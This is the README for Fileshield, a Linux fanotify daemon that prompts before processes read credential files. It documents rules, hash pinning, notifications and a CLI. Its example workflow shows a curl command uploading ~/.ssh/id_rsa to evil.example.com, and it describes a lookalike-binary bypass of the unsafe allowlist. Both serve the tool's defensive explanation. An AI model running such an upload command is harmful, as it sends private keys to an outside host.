# Fileshield

> **Fork notice:** This repository was originally forked from
> [YoranSys/FileShield](https://github.com/YoranSys/FileShield), but has
> diverged significantly and is for all intents and purposes a new project which
> uses a completely different permission model.

## Purpose

Fileshield is an additional layer of defense against supply chain attacks and on
machines where agents run with filesystem access. It watches sensitive files
(cloud credentials, SSH keys, kubeconfig, API tokens etc...) and prompts the
operator before a process can read the file, for example an agent accidentally
pulling `~/.aws/credentials` into a prompt or a compromised vscode extension or
npm package scanning for api keys in your home directory.

It is **not a definitive security tool**: I am not a security expert and I
cannot guarantee that Fileshield will catch everything and cannot be bypassed.
It is not a substitute for sandboxing, least-privilege users, or a secret
manager. Its value is as a backstop for when other harnesses or sandbox measures
fail, Fileshield notifies the operator that a sensitive file is being read and
blocks it until explicit approval is given.

## What it does

**Fileshield** is a Linux security tool that intercepts and blocks file access to sensitive files (e.g., AWS secrets, SSH keys, kubeconfig) before the read completes, then prompts the user to allow or deny it. It is built on **`fanotify` permission events** — the same kernel mechanism used by Linux antivirus scanners.

> Unlike approaches based on `inotify` or `auditd` alone, Fileshield uses `FAN_OPEN_PERM` events which suspend the syscall in the kernel until a decision is made. The file data is never read by the requesting process until you click Allow.

---

## Features

- **True pre-access blocking**: The kernel suspends the `open()` syscall until Fileshield responds — no race condition.
- **Interactive prompts**: A single `kdialog --menu` popup asks for permission before any data is exposed; the dialog inherits your session's Qt theme, fonts and scaling.
- **Scoped decisions**: _Allow Once_ is file-scoped with a `user_ttl`; _Allow Session_ is scoped to that binary and exact file for the lifetime of the shell session (optionally capped by `session_ttl`); _Allow Always_ is a persistent rule bound to the binary hash, call chain, exact file and exact command line. Matching deny scopes exist too.
- **Hash-pinned allowlists**: `[allowlist]` rules record the binary's SHA-512 on first use and require an explicit popup approval if it ever changes; `[unsafe_allowlist]` opts tools with unpinnable binaries (AppImages, tmp mounts) out of hash checking.
- **Security tripwires**: `[unsafe_allowlist]` grants log at `WARNING` and raise a warning desktop notification on the first hit per process, so an impersonated binary exploiting a broad unsafe rule is visible immediately; `[denylist]` blocks raise a `critical` notification. Both name the matched rule, binary and target, and are bounded by a configurable dedup window and global flood cap; the pinned `[allowlist]` can notify too, off by default.
- **SRE secrets covered by default**: AWS, kubeconfig, SSH keys, GCP, Azure,
  Vault token, Docker config, and more — out of the box. Please feel free to
  open an issue suggesting additional defaults.

---

## Requirements

- Linux kernel **5.0+** (5.1+ recommended)
- **`kdialog`** (for GUI popups; part of KDE but works in other desktop environments too)
- On non-KDE desktops, a Qt platform theme integration (e.g. `qgnomeplatform`/adwaita-qt for GNOME, `qt6ct`) if you want the dialog to match the system theme; without one kdialog falls back to Qt's default light theme
- **`notify-send`** (libnotify) for the optional rule-hit notifications. Without it, or without a detectable desktop session, notifications are skipped and access decisions are unaffected

---

## Architecture

The pipeline runs for every `FAN_OPEN_PERM` event. Rules come from
`/etc/fileshield.conf`: `[protected_paths]` decide what is watched,
`[unsafe_allowlist]`, `[allowlist]` and `[denylist]` decide what is allowed
or denied, and `[settings]` tunes the cache TTLs, session caps and
notifications. A denial always wins over any grant.

```text
Process syscall: open("/home/user/.aws/credentials", O_RDONLY)
        │
        ▼
  fanotify FAN_OPEN_PERM          ← kernel blocks syscall here
        │
        ▼
  fileshield daemon — decision pipeline
  │
  ├─ config denylist ─────────────▶ FAN_DENY (+ notify-send tripwire)
  ├─ session deny / runtime deny ─▶ FAN_DENY
  ├─ allow-once cache
  ├─ session allow / runtime allow ▶ FAN_ALLOW
  ├─ [unsafe_allowlist] ──────────▶ FAN_ALLOW + WARNING + notify-send
  │                                  (no hash check; surfaced once per process)
  └─ hash-pinned [allowlist]
       ├─ pin matches ────────────▶ FAN_ALLOW
       ├─ first use ──────────────▶ FAN_ALLOW + pin stored in
       │                             /var/lib/fileshield/allowlist-hashes.json
       ├─ hash changed ───────────▶ kdialog "Update & Allow?"
       │                              ├─ Yes ─▶ re-pin + FAN_ALLOW
       │                              └─ No/Cancel/timeout ─▶ FAN_DENY
       │                                                        (old pin kept)
       └─ digest unavailable ─────▶ fall through to the dialog (fail closed)
        │
        ▼
  no rule matched → kdialog --menu popup (selection on stdout)
        │
        ├─ Allow Once ───────────▶ FAN_ALLOW (cached for user_ttl)
        ├─ Allow  → Session ─────▶ FAN_ALLOW (until terminal closes)
        │         → Always ──────▶ FAN_ALLOW (+ runtime-allowlist.json)
        ├─ Deny   → Session ─────▶ FAN_DENY  (until terminal closes)
        │         → Always ──────▶ FAN_DENY  (+ runtime-denylist.json)
        └─ Deny ─────────────────▶ FAN_DENY  (this attempt only)
        │
  syscall resumes (or fails with EPERM)
```

---

## Installation

### 1. Install Dependencies

```bash
# Debian/Ubuntu
sudo apt update && sudo apt install kdialog

# Fedora
sudo dnf install kdialog

# Arch
sudo pacman -S kdialog
```

### 2. Clone and Build

```bash
git clone https://github.com/yourusername/fileshield.git
cd fileshield
make
sudo make install
```

`make install` installs the daemon to `/usr/local/sbin/fileshield` and the `fileshield-cli` management tool (see [Command-line management](#command-line-management-fileshield-cli)) to `/usr/local/bin/fileshield-cli`, plus the systemd unit, and writes `/etc/fileshield.conf` **only if it does not already exist** — upgrades and reinstalls keep your local rules. If the file is present, the installer says so and leaves it untouched.

To replace `/etc/fileshield.conf` with the shipped defaults instead (this discards every local edit — back it up first):

```bash
sudo make install REPLACE_CONFIG=1
# equivalent convenience target
sudo make install-config
```

### 3. Start

```bash
sudo systemctl enable --now fileshield
```

The daemon requires root (`CAP_SYS_ADMIN`) to open a `fanotify` permission fd — this is a kernel requirement.

---

## Usage

Edit `fileshield.conf` to adjust protected paths, the allowlists or the denylist, then reload:

```bash
sudo systemctl reload fileshield
# or equivalently:
sudo kill -HUP $(pidof fileshield)
```

Sending `SIGHUP` to the daemon causes it to re-read `fileshield.conf`, remove old fanotify marks, and re-register the new set. If the new set cannot be installed completely, the daemon restores the previous marks and keeps the old config; if even the rollback fails it shuts down so systemd restarts it cleanly (fail closed). Persisted state — the _Always Allow_ / _Always Deny_ lists and the `[allowlist]` hash pins — is reloaded from disk at the same time, so edits to the state files (or the state files written by the dialogs themselves) take effect on reload. Session-scoped decisions live only in daemon memory: a config reload keeps them, a full daemon restart clears them (you are prompted again). The persisted state can also be managed live with `fileshield-cli` (see [Command-line management](#command-line-management-fileshield-cli)): its mutations go through the daemon's control socket, so memory and disk change together and no reload is needed.

### Default Protected Paths

The default `[protected_paths]` list ships in [`fileshield.conf`](fileshield.conf); `make install` copies it to `/etc/fileshield.conf` on first install, and later installs keep the existing file (see [Installation](#installation)). It is the authoritative list and is maintained there rather than duplicated here. It covers common credential stores: shell histories and environment files, SSH and GPG key material, cloud CLIs (AWS, Azure, GCP, Cloudflare, and others), Kubernetes and container registries, package-manager tokens, password managers, and AI coding agents. Edit the installed copy and reload.

Paths listed in `[protected_paths]` that do not exist yet are skipped at startup with a warning. They remain covered by a mount mark on their filesystem, so opening the file after it is created is still intercepted; run `sudo systemctl reload fileshield` (or `kill -HUP`) to add a direct mark. The daemon refuses to start if any configured path that exists cannot be marked, if `[protected_paths]` is empty, or if nothing at all could be marked (fail closed). A config that exceeds the parser's hard caps is refused as a whole instead of being truncated — see [Limitations](#limitations). An unknown section header refuses the whole config too, so a typo cannot silently drop the rules under it. The config must be root-owned and not writable by group or other: the daemon refuses a file another user could modify.

#### Glob patterns in `[protected_paths]`

Entries may contain `*` and `**`:

```ini
~/.cloudflared/*.json
~/.cloudflared/**/*.json
~/.ssh/id_*
```

These protect, respectively: files directly inside `~/.cloudflared`; the same at any depth (including directly inside); and key material inside `~/.ssh`.

- Comments start with `#` **only at the beginning of a line** (after optional whitespace). A `#` anywhere else is a literal path byte, not a trailing comment — and because a pattern containing it would then match nothing, the whole config is refused at load with a clear message, rather than silently protecting nothing. Put explanatory comments on their own lines.

- `*` matches any characters **within one path segment** and never crosses `/`. It matches dotfiles too (`.env.local` is covered by `~/.env*`).
- `**` is a **whole-segment** wildcard that matches zero or more segments: `~/.cloudflared/**/*.json` also matches `~/.cloudflared/a.json`, and `~/.cloudflared/**` protects the whole tree. At most **one `**` segment per pattern**; a second one is rejected at load (the matcher carries a single backtrack slot, and silently under-matching would mean silently not protecting).
- Patterns must be absolute after `~` expansion. `?`, `[`, `]` and `\` are literal characters; matching is case-sensitive.
- Exact entries keep their _equal or under_ semantics — `~/.ssh/` protects the directory and everything inside it. A **glob** entry matches only paths that fully match the pattern, so a glob-matched directory does not silently cover its contents: use `~/.cloudflared/*` for direct children and `~/.cloudflared/**` for the whole subtree.
- A glob entry marks its wildcard-free base directory (`~/.cloudflared`). A base that does not exist yet behaves like a missing exact path: it is skipped at startup and covered by a mount mark on its filesystem until it appears (reload to add the direct mark).
- A malformed pattern (relative, an unresolved `.` or `..` segment, more than one `**` segment, `//` or a trailing slash in the wildcard part) is rejected at load time with a log message — it never silently protects nothing.
- A pattern whose wildcard-free base is `/` (any wildcard in the first path segment, including `/**` and `/**/name`) **refuses the whole config at load**: it would install a mount mark on the root filesystem. Anchor globs below a non-root directory instead.
- A line starting with `!` is an **exclusion**: it removes matching paths from protection instead of adding it. `~/.ssh/` plus `!~/.ssh/*.pub` protects the whole directory except public keys; add `!~/.ssh/**/*.pub` to exclude nested ones too.
- Exclusions **win over positives** and config order does not matter (deny wins): a path is protected if and only if a positive entry matches it and no exclusion does. They must be absolute after `~` expansion, are canonicalized and matched exactly like positives, and a malformed exclusion is rejected at load. An exclusions-only `[protected_paths]` refuses to start.
- Exclusion matching is path-based: a private key misnamed `*.pub` would be excluded too.

### Unsafe Allowlist

`[unsafe_allowlist]` uses the same format as `[allowlist]` (globs included) but its hits are **never hash-checked or hash-pinned**: a matching access is granted immediately, exactly as `[allowlist]` rules behaved before pinning existed. It is evaluated **before** `[allowlist]`.

Use it only for tools whose binary genuinely cannot be pinned — AppImages or other tmp-mount tools whose binary churns (rebuilt or replaced on every run), or tools that are reinstalled or upgraded many times a day:

```ini
[unsafe_allowlist]
# /tmp/.mount_*/openchamber = ~/.local/share/opencode/
```

This is the escape hatch for the pin's one real trade-off (see [Allowlist](#allowlist)): a glob rule pins its pattern, so every binary matching it shares one pin and switching between them prompts. Prefer `[allowlist]` whenever the binary is stable enough to pin.

#### Handle with caution

Because an unsafe rule never checks the binary hash, it is only as narrow as its pattern. Any process that can create a path matching the rule and name its binary accordingly inherits the grant. The concrete attack this section was written for: a rule such as

```ini
/tmp/.mount_*/openchamber = ~/.local/share/opencode/
```

grants any binary called `openchamber` under a matching `/tmp/.mount_*` directory access to the opencode data directory. An attacker who knows or guesses that such a pattern exists can create a lookalike mount directory and binary and read the secrets through it. The configuration file is root-owned and read-only, but the _pattern_ is guessable, and no hash check stands in the way.

Treat `[unsafe_allowlist]` as a deliberate hole: use it only when the matching binary genuinely cannot be pinned, and keep patterns as narrow as the tool allows. The mitigation is visibility — the **first** hit per process is logged at `WARNING` with the matched rule, binary, PID and target (repeats log at `INFO`), and `notify_unsafe_allowlist` is **on by default**, so it also raises a warning notification (normal urgency, warning icon, subject to the [flood control](#notifications)). If a warning or notification appears for a binary you did not launch, treat it as a security incident: find the process, and tighten or remove the rule.

### Allowlist

The `[allowlist]` section rules are **hash-pinned**. Pre-allowlisting a binary by path is still a conscious trust decision: the first matching access silently records the binary's SHA-512, and every later access must match it, so a replaced or tampered binary cannot inherit the rule without an explicit prompt.

Add entries only for tools you have audited and trust:

```ini
[allowlist]
# Format: /absolute/path/to/binary = /path/to/target/file
# /usr/bin/ssh       = ~/.ssh/known_hosts
# /usr/bin/gpg       = ~/.gnupg/
# /tmp/.mount_*/openchamber = ~/.local/share/opencode/
# /usr/bin/opencode  = ~/.local/
```

#### Glob rules

Either side of a rule may use the same `*` / `**` syntax as [`[protected_paths]`](#glob-patterns-in-protected_paths):

- `*` matches any characters **within one path segment** and never crosses `/`; `**` matches **zero or more** whole segments. `?`, `[`, `]` and `\` are literal characters, and matching is case-sensitive and full-path.
- An **exact binary** matches by path equality; an **exact target** is matched _equal or under_ (`/usr/bin/gpg = ~/.gnupg/` covers the directory and everything inside it).
- A **glob target** is matched full-path, so write `/**` when it should cover a whole subtree: `... = ~/.local/share/opencode/**` includes nested files, while `... = ~/.local/share/opencode/*` covers only direct children.
- `[unsafe_allowlist]` and `[denylist]` accept the same globs on both sides.
- A malformed pattern (relative, no static base, an unresolved `.` or `..` segment, more than one `**` segment, or an empty segment such as `//` or a trailing slash after the wildcard part) is rejected at load with a log message — it never silently matches nothing.
- A **scoped** entry (`binary = target`) grants the binary access to that one target file or folder. A **bare** entry (binary alone, no `=`) is a **global rule**: the binary may access _every_ protected path — the most dangerous form. A binary may appear on **multiple lines** with different targets when it needs exceptions for more than one file or folder.
- `~` in either side expands for every regular user's home (UID 1000–65533; root and system accounts are skipped), the same way `[protected_paths]` do.
- Rules do not carry a per-entry TTL: repeated opens refresh the file cache for `user_ttl` seconds (see [Settings](#settings)).

#### Hash pinning

The pin key is the rule's **canonical binary pattern** (the left-hand side, after `~` expansion and canonicalization); the pinned value is the SHA-512 of the binary that first matched it. An exact rule therefore pins one binary path, while a glob rule pins the pattern — which is what lets an AppImage keep working across random `/tmp/.mount_*` paths.

- **First use** (no stored pin): the digest is recorded silently and the access is allowed. The state file is written immediately (atomically); a failed write logs a warning and still allows the access, and the next daemon start re-pins.
- **Matching pin**: allowed normally.
- **Changed hash**: a `kdialog` prompt shows the rule pattern, the concrete binary, the old and new SHA-512 (16-hex prefixes; the full digests go to the journal), the target file and the command. **Update & Allow** replaces the pin and allows that access; **Deny**, Cancel, window close and timeouts deny **this attempt only** and keep the old pin. The next access prompts again, subject to the dialog rate limiter.
- **Hash unavailable**: if the digest cannot be computed (fork/exec failure, timeout) or the binary deliberately is not hashed because it lives under a protected path, the access falls back to the normal Allow Once/Session/Always dialog — never a silent grant.
- **Damaged pin file**: an existing but unreadable or corrupt `allowlist-hashes.json` fails closed: every `[allowlist]` match behaves as _hash unavailable_ (normal prompt, no silent re-pin) with an error log until an admin repairs or removes the file. A missing file is normal first use.

Pins live in `/var/lib/fileshield/allowlist-hashes.json` (root-only, mode 0600, written atomically). The table holds at most **256 entries**; storing a new one evicts the entry with the oldest `updated_at`. The file is re-read on daemon startup and on every `SIGHUP` reload, so repairing or deleting a damaged file takes effect on reload. Pins can be listed, described, removed and cleared with `fileshield-cli` (see [Command-line management](#command-line-management-fileshield-cli)); the change dialog remains the only way to add or update a pin, and root may still review the JSON directly.

Because a glob rule pins the pattern itself, two different binaries matching the same rule **share one pin**, so switching between them triggers the change prompt — use [`[unsafe_allowlist]`](#unsafe-allowlist) when that churn is constant.

> **Upgrading from a pre-pinning config?** Existing `[allowlist]` entries keep working. Their first access pins the binary that exists then — silently, as usual. After that, every in-place binary upgrade triggers one hash-change prompt on its next access (approve it to re-pin the new build).

> **Why not pre-allowlist common SRE tools?**  
> A supply-chain attack that replaces `/usr/local/bin/aws` can no longer use the rule silently: the replaced binary triggers an explicit hash-change prompt. An empty default still forces a conscious opt-in decision per tool, and approving an unexpected change prompt is exactly how trust erodes — read the dialog.

### Denylist

`[denylist]` uses the same format and glob syntax as `[allowlist]` but denies access:

```ini
[denylist]
# Format: /absolute/path/to/binary = /path/to/target/file
# /usr/bin/curl       = ~/.netrc
# /usr/bin/nc
```

A scoped entry denies the binary that one file or folder; a bare binary line is a global deny covering every protected path; the same binary may appear on multiple lines. Deny rules are **never hash-pinned or hash-checked**: a pin detects a replaced allowlisted binary, while a deny blocks the access no matter which binary matches. **Denials are always evaluated first**: a config denylist hit produces `FAN_DENY` (the open fails with `EPERM`) before any allowlist, cache, or session rule is consulted, and no dialog is shown.

### Settings

```ini
[settings]
# How long an "Allow Once" decision is cached for the same process and file
# (seconds).  Config rule hits also refresh the cache with this TTL.
# 0 disables caching (each open prompts again); the shipped config sets 300.
user_ttl = 300

# Cap for "Allow Session" / "Deny Session" decisions (seconds).
# 0 = the decision lives exactly as long as the shell session (session leader);
# a positive value additionally expires it after that many seconds.
session_ttl = 0

# Log the per-event debug details ([event]/[dedup]/[pump] plumbing) in
# addition to the one-line-per-access INFO record.  Off by default; the
# daemon's -d/--debug flag enables the same thing for a single run.
debug = no

# Desktop notifications (notify-send) on config-rule hits.  The unsafe
# allowlist and the denylist warn by default; the hash-pinned allowlist is
# opt-in.  See "Notifications" below.
notify_unsafe_allowlist = yes
notify_allowlist = no
notify_denylist = yes

# Identical (list, binary, target) notifications are suppressed for this
# many seconds; 0 notifies on every hit.
notify_dedup_ttl = 60

# Global cap: at most this many notifications per 60-second window, after
# which the flood is logged once and further notifications are dropped for
# the window.  Must be >= 1.
notify_max = 20
```

### Notifications

Fileshield can raise a desktop notification through `notify-send` whenever a **config rule** resolves an access — not for user dialog decisions, which are already explicit. Three per-list toggles control it:

| Setting                   | Default | Notifies on                                  |
| ------------------------- | ------- | -------------------------------------------- |
| `notify_unsafe_allowlist` | `yes`   | `[unsafe_allowlist]` grant                   |
| `notify_allowlist`        | `no`    | `[allowlist]` grant (pin match or first use) |
| `notify_denylist`         | `yes`   | `[denylist]` block                           |

The `[unsafe_allowlist]` and `[denylist]` defaults are the security tripwires: an unsafe hit is a grant that skipped hash pinning (see [Handle with caution](#handle-with-caution)), and a denylist hit is an access someone tried to make. The unsafe notification uses `normal` urgency with the `dialog-warning` icon (`notify-send` has no warning urgency), the denylist notification uses `critical`, and the optional allowlist notification is `normal`.

A notification names the matched rule pattern, the concrete binary (PID and process name) and the target file:

```text
Fileshield: unsafe allowlist rule used
rule:   /tmp/.mount_*/openchamber
binary: /tmp/.mount_Ab3xY/openchamber (pid 4321, openchamber)
target: /home/user/.local/share/opencode/auth.json
```

An attacker can trigger these notifications, so delivery is bounded by two settings: identical `(list, binary, target)` hits are suppressed for `notify_dedup_ttl` seconds (default 60; `0` notifies every hit), and `notify_max` (default 20) caps how many notifications are delivered per 60-second window — a burst of distinct keys beyond the cap is logged once and dropped for the window. Notifications are best-effort: without a detectable desktop session or without `notify-send`, they are skipped and the access decision is unchanged. The journal remains the authoritative record — a notification is a heads-up, not an audit trail.

`[unsafe_allowlist]` notifications are gated **once per process**: the first unsafe grant from a PID logs at `WARNING` and raises the notification, while later grants by the same process log at `INFO` marked `(repeat)` without notifying. Another process using the same rule is a new instance and surfaces again — so `notify_dedup_ttl` applies to the allowlist and denylist notifications, not to unsafe ones (the global cap still applies to all).

### Example Workflow

When an unknown process (e.g., `curl` spawned from `/tmp`) tries to open `/home/user/.ssh/id_rsa`:

1. The kernel suspends the `open()` call.
2. A menu popup appears listing every scope as its own row, with the access details above it:

   ```text
   Process curl (PID 4521, parent: bash (PID 4518)) wants to read:

   Binary:   /tmp/curl
   Command:  curl -s https://evil.example.com --upload-file /home/user/.ssh/id_rsa
   Path:     /home/user/.ssh/id_rsa

   • Allow Once — this file and process, cached 300 seconds
   • Allow Session — this binary and file, until the requesting session ends
   • Allow Always — saved permanently for this command and file
   • Deny rows block with the same scopes
   Cancelling or closing this dialog, or any failure, denies this attempt only.

   [Allow Once - this file and process, cached 300 seconds]
   [Allow Session - this binary and file until the session ends]
   [Allow Always - saved permanently for this command and file]
   [Deny Once - block this access only]
   [Deny Session - block this binary and file until the session ends]
   [Deny Always - block permanently for this command and file]
   ```

   Each row repeats its scope's concise description inline, so the
   decision never depends on re-reading the block above.

   The **Deny Once** row is the dialog's preselected default (`--default`):
   confirming without a deliberate selection — including an accidental
   Enter — denies this attempt rather than granting anything.

   The description is rendered as left-aligned rich text: keys (*Binary*,
   *Command*, *Path*) and the scope names are bold, and every value is
   HTML-escaped before it is shown, so a crafted file name cannot forge
   markup inside the prompt.

   The selection is reported by kdialog on **stdout** (the chosen row's
   tag) together with a zero exit code — the only way a grant can happen.
   Every failure mode (cancel, window close, timeout, runtime error, even
   kdialog exiting 1 the way it does for some internal errors) leaves
   stdout empty, which means: deny this attempt. Nothing persists unless
   you deliberately pick a row that says it persists.

3. **Deny Once** → `FAN_DENY` — the process receives `EPERM`, the file is never read.
4. **Allow once** → `FAN_ALLOW` — access is granted and cached for this process and this exact file for `user_ttl` seconds.
5. **Allow session** → `FAN_ALLOW` — this binary may read this exact file in this shell session until the session leader exits (or `session_ttl` elapses, whichever comes first). Other binaries and other files still prompt.
6. **Allow always** → `FAN_ALLOW` — a persistent rule bound to the binary hash, call chain, exact file and exact command line is created (see below).

### Decision Scopes

| Choice        | Matches on                                                    | Lifetime                                                          | Persisted                |
| ------------- | ------------------------------------------------------------- | ----------------------------------------------------------------- | ------------------------ |
| Allow Once    | PID + binary + exact file                                     | `user_ttl` seconds                                                | no                       |
| Allow Session | POSIX session + binary (+ SHA-512) + exact file               | until the shell/session leader exits, capped by `session_ttl`     | no                       |
| Allow Always  | binary SHA-512 + call chain + exact file + exact command line | until removed                                                     | `runtime-allowlist.json` |
| Allowlist pin | matched `[allowlist]` rule binary pattern + binary SHA-512    | until a hash change, CLI removal, or eviction at 256 pins         | `allowlist-hashes.json`  |
| Deny Session  | same key shape as Allow Session                               | same as Allow Session                                             | no                       |
| Deny Always   | same key shape as Allow Always                                | until removed                                                     | `runtime-denylist.json`  |
| Deny          | —                                                             | this attempt (rapid retries of the same open are denied for ~2 s) | no                       |

Denials are always checked before grants, so a config, session or permanent denial can never be bypassed by an allow rule or a cached _Allow Once_. The decision order is: config denylist → session deny → runtime deny → file cache → session allow → runtime allow → `[unsafe_allowlist]` → hash-pinned `[allowlist]` → dialog. An open that reaches a protected inode through a path outside every protected prefix (a hard link) never takes a grant from those lists: it always shows the dialog, so an approval for the original path cannot silently cover the link. For the same reason a **scoped config deny** does not fire on a hard-link open — the resolved path is the unprotected alias, and the daemon cannot tell which protected path the inode belongs to — so the attempt falls through to the always-prompt path rather than `EPERM`; a bare global deny still applies.

Persisted _Always_ entries carry a stored 16-hex `rule_id` (and a real `created_at` preserved across every save); live session entries carry one too. `fileshield-cli` lists, describes, removes, clears and prunes persisted rules by ID, and lists, describes, removes and clears session rules (see [Command-line management](#command-line-management-fileshield-cli)).

While one decision dialog is open, every _other_ open still runs the full pipeline immediately: deny rules deny, and cache/session/rule grants allow — only opens that genuinely need the user queue behind the pending decision. A rule-covered read (for example your shell's history file matching an allowlist) therefore never waits behind another secret's prompt.

`session_ttl` is configured in `[settings]` and defaults to `0`, meaning session decisions live exactly as long as the shell session itself. A non-zero value additionally expires them after that many seconds.

### Always Allow — runtime dynamic allowlist (persistent)

Clicking **Always Allow** stores a fingerprinted, file- and command-scoped entry in the daemon's in-memory allowlist **and persists it to disk** for reuse after daemon restart or reboot:

| Attribute checked on every future match       | Why                                                                                                                      |
| --------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| Binary path                                   | Basic identity                                                                                                           |
| **SHA-512 of the binary**                     | Detects on-disk replacement (supply-chain attack)                                                                        |
| **Call chain** (up to 3 ancestors)            | Prevents a different caller from inheriting the rule                                                                     |
| **SHA-512 of each ancestor exe**              | Detects replaced parent binaries                                                                                         |
| **Target file**                               | Least privilege: approving `kubectl` for `~/.kube/config` does not grant `~/.ssh/id_rsa`                                 |
| **Command line** (stored, matched by SHA-512) | Only the exact invocation, arguments included, stays silent: `kubectl get pods` does not authorize `kubectl get secrets` |

**Example:** clicking _Always Allow_ for the popup shown above records:

```text
binary:         /usr/bin/curl     (sha512: a3f1…)
target:         /home/user/.ssh/id_rsa
command:        curl -s https://evil.example.com --upload-file /home/user/.ssh/id_rsa
parent[0]:      bash              (sha512: 7c82…)
parent[1]:      systemd           (sha512: 0d4e…)
```

A future `curl` call from `zsh` instead of `bash` will prompt again because the call chain differs. A trojaned `/usr/bin/curl` will also prompt again because its SHA-512 has changed. The same binary reading `~/.aws/credentials` prompts because the target differs, and invoking it with different arguments (e.g. `kubectl get pods` vs `kubectl get secrets`) prompts because the command line differs.

> The command line is stored verbatim in the root-only (0600) state file so entries can be reviewed, and a SHA-512 over the **full raw command line** (arguments and all, bounded at 64 KB) is the matching key — two invocations that share a long prefix do not collide. Arguments may therefore contain secrets (`-p…`, tokens); the state file is readable only by root, but treat it accordingly. State entries written by older versions without a `target_path` or a command line, and entries whose stored fingerprint predates full-line hashing, no longer match: the access is prompted again (fail closed), and choosing _Always_ records a fresh entry. Remove stale duplicates with `fileshield-cli prune` (see [Persistence](#persistence)).

#### Persistence

_Always Allow_ and _Always Deny_ entries are stored in JSON state files (`/var/lib/fileshield/runtime-allowlist.json` and `/var/lib/fileshield/runtime-denylist.json`) with strict permissions (mode 0600, root-only). The entries are:

- **Automatically loaded** when the daemon starts (on reboot, after systemctl restart, etc.)
- **Immediately saved** when you click "Always Allow" / "Deny Always" (no manual action needed)
- **Fail-secure**: if a state file is corrupted or unreadable, the daemon starts with an empty list and reprompts; entries missing a target file or a recorded command line are dropped

Each entry records its stored rule ID, the binary path and SHA-512, the target file, the exact command line (stored verbatim) together with its SHA-512 fingerprint, the ancestor call chain, and the real creation time:

```json
{
  "rule_id": "dd8bf55d3c0e4a1b",
  "binary": "/usr/bin/kubectl",
  "binary_sha512": "a3f1…",
  "target_path": "/home/user/.kube/config",
  "cmdline": "kubectl config view --minify",
  "cmdline_sha512": "0123…",
  "chain_depth": 1,
  "chain_comm[0]": "zsh",
  "chain_sha512[0]": "7c82…",
  "created_at": 1700000000
}
```

The daemon assigns the 16-hex `rule_id` at creation and preserves both it and `created_at` across every save. A state file written by an older version loads normally: entries missing an ID get one assigned on load (unique within the list, grants preserved) and the file is rewritten immediately, so the migration survives a restart.

Manage these entries with [`fileshield-cli`](#command-line-management-fileshield-cli), which changes the daemon's in-memory lists and the state file together, so no reload is needed:

```bash
# Every persisted allow/deny rule, with its stored ID
sudo fileshield-cli list rules

# One entry in full, including every recorded digest
sudo fileshield-cli describe allow dd8bf55d

# Remove or clear entries (each asks [y/N] first; -y skips the prompt)
sudo fileshield-cli remove allow dd8bf55d
sudo fileshield-cli clear allow

# Collapse stale duplicates left behind by binary updates
sudo fileshield-cli prune --dry-run
sudo fileshield-cli prune
```

The files stay plain root-only JSON, so manual inspection still works (`sudo cat /var/lib/fileshield/runtime-allowlist.json | jq .`); edit through the CLI so the daemon's memory and the file cannot diverge. A hand edit is picked up on the next reload.

`[allowlist]` hash pins use a separate state file (`/var/lib/fileshield/allowlist-hashes.json`) with the same permissions and reload behavior; see [Hash pinning](#hash-pinning).

---

## Command-line management (fileshield-cli)

`fileshield-cli` is a root-only management CLI built alongside the daemon by `make` and installed to `/usr/local/bin/fileshield-cli` by `make install`. It lists and describes the persisted _Always_ rules and `[allowlist]` hash pins, removes, clears and prunes them, inspects and clears live session rules, and asks the daemon to reload — no hand-editing of the JSON state files required.

```text
fileshield-cli list [rules|allow|deny|pins]     # no argument: all three tables
fileshield-cli describe allow|deny|pin [ID]     # every field/digest; all when no ID
fileshield-cli remove allow|deny|pin <ID>...    # asks [y/N] unless -y
fileshield-cli clear allow|deny|pins            # asks [y/N] unless -y
fileshield-cli prune [allow|deny] [-n]          # lists groups, asks [y/N] unless -y
fileshield-cli session list [allow|deny]        # live rules from daemon memory
fileshield-cli session describe [allow|deny] [ID]
fileshield-cli session remove [allow|deny] <ID>...
fileshield-cli session clear [allow|deny]
fileshield-cli reload                           # ask the daemon to reload now
```

| Flag              | Effect                                                                    |
| ----------------- | ------------------------------------------------------------------------- |
| `-y`, `--yes`     | assume yes for every confirmation (needed on a non-terminal)              |
| `-n`, `--dry-run` | `prune` only: list the groups, change nothing                             |
| `--wide`          | no binary/ARG/TARGET truncation, and 16-character IDs                     |
| `--json`          | machine-readable output for `list`/`describe` (rules, pins and sessions)  |
| `-h`, `--help`    | usage help; `-v`, `--version` prints the CLI version                      |

Exit status is `0` on success, `1` on failure or a declined/refused confirmation, and `2` on a usage error.

### Example output

`list rules` merges allow and deny entries, oldest `created_at` first; `list` with no argument adds the pins (oldest `updated_at` first), and a totals footer closes the output. Binary, ARG and TARGET are tail-truncated on a narrow terminal — the end of a path is the informative part — and `--wide` prints them in full.

```text
ID        Rule   Binary       ARG                    TARGET            CHAIN
dd8bf55d  ALLOW  ...bin       args without bin name  .../secret        code-oss > electron > zsh

ID        Binary                   Last Updated
c54d92cd  /nix/store/.../binary    2026-09-12 13:52:33

1 allow, 0 deny, 1 pin
```

### Rule IDs

Every persisted allow/deny rule stores a **16-character lowercase hex rule ID**; tables show the first 8 characters by default and all 16 with `--wide`, while `describe` always prints the full ID together with every recorded digest. Pin IDs are not stored: they are derived from the pin's canonical binary pattern (the first 16 hex characters of SHA-512 over the pattern) whenever they are needed.

Commands that take an ID accept the full 16 characters or any **unambiguous prefix of at least 8 characters**. A shorter, non-hex or ambiguous prefix is rejected before anything happens and the error asks for the full ID to tell the candidates apart; `describe allow|deny|pin` with no ID prints every entry of that kind so the IDs can be read off.

### Reads, mutations and the control socket

- `list` and `describe` read the root-only state files directly, so they work while the daemon is stopped; a damaged file is reported, never silently treated as empty.
- Every mutation (`remove`, `clear`, `prune`, all `session` commands) goes through the daemon's root-only control socket at `/run/fileshield/control.sock` (mode 0600, peer uid checked; systemd creates the `/run/fileshield` directory via the unit's `RuntimeDirectory=`), so the daemon's in-memory lists and the state files change together and no reload is needed. Run the CLI as root.
- When — and only when — no daemon answers (socket missing or connection refused), rules/pins mutations fall back to editing the state file directly and warn that the daemon must be started to enforce the change. Any other error (for example `EACCES`) is never a fallback.
- Session rules exist only in daemon memory (a daemon restart clears them), so session commands require the running daemon and have no file fallback.

### Session rules

`session list` prints ID, Rule, SID, Binary, Target and Expires, soonest expiry first with session-lifetime entries (`until session ends`) last; `session describe` prints one record per block and accepts an optional ID. Session entries are not persisted and vanish on daemon restart.

### Prune

